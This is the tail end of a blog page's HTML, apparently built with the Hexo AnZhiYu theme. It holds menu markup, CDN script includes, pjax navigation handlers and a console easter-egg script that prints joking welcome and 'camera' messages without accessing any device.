class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("03/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 stoocea 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="java"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>